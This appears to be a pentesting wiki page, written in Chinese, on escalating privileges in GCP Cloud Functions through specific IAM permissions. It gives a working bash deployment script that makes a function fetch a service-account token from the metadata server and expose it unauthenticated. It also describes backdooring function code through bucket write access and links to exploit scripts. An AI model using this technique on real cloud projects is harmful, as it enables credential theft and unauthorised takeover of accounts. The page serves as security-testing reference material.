# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

有关 Cloud Functions 的更多信息：

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

拥有这些权限的攻击者可以**创建一个带有任意（恶意）代码的新 Cloud Function，并将其分配给一个服务账户**。然后，从元数据中泄露服务账户令牌以提升权限。\
可能需要一些权限来触发该函数。

此方法的利用脚本可以在 [这里](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) 和 [这里](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) 找到，预构建的 .zip 文件可以在 [这里](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions) 找到。

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

拥有这些权限的攻击者可以**修改函数的代码，甚至修改附加的服务账户**，目的是提取令牌。

> [!CAUTION]
> 为了部署云函数，您还需要对默认计算服务账户或用于构建映像的服务账户具有 actAs 权限。

可能还需要一些额外的权限，例如版本 1 cloudfunctions 的 `.call` 权限或角色 `role/run.invoker` 来触发该函数。
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> 如果您收到错误 `Permission 'run.services.setIamPolicy' denied on resource...`，这意味着您正在使用 `--allow-unauthenticated` 参数，并且您没有足够的权限。

该方法的利用脚本可以在 [这里](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py) 找到。

### `cloudfunctions.functions.sourceCodeSet`

通过此权限，您可以获取一个**签名的 URL，以便能够将文件上传到函数存储桶（但函数的代码不会被更改，您仍然需要更新它）**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
不太确定仅凭这个权限从攻击者的角度有多有用，但知道这一点是好的。

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

给自己任何之前的 **`.update`** 或 **`.create`** 权限以进行升级。

### `cloudfunctions.functions.update`

仅拥有 **`cloudfunctions`** 权限，而没有 **`iam.serviceAccounts.actAs`** 你 **将无法更新函数，因此这不是一个有效的权限提升。**

### 对存储桶的读写访问

如果你对存储桶有读写访问权限，你可以监控代码的变化，并且每当 **存储桶中发生更新时，你可以用自己的代码更新新代码**，这样新版本的云函数将运行提交的后门代码。

你可以在以下位置查看更多关于攻击的信息：

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

然而，你不能用这个来预先攻陷第三方云函数，因为如果你在你的账户中创建存储桶并给予公共权限以便外部项目可以在其上写入，你会收到以下错误：

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> 然而，这可以用于拒绝服务攻击。

### 对Artifact Registry的读写访问

当创建云函数时，一个新的docker镜像会被推送到项目的Artifact Registry。我尝试用一个新的镜像修改当前镜像，甚至删除当前镜像（和 `cache` 镜像），但没有任何变化，云函数继续工作。因此，也许 **可能可以利用竞争条件攻击** 像存储桶那样更改将要运行的docker容器，但 **仅仅修改存储的镜像无法攻陷云函数**。

## 参考文献

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
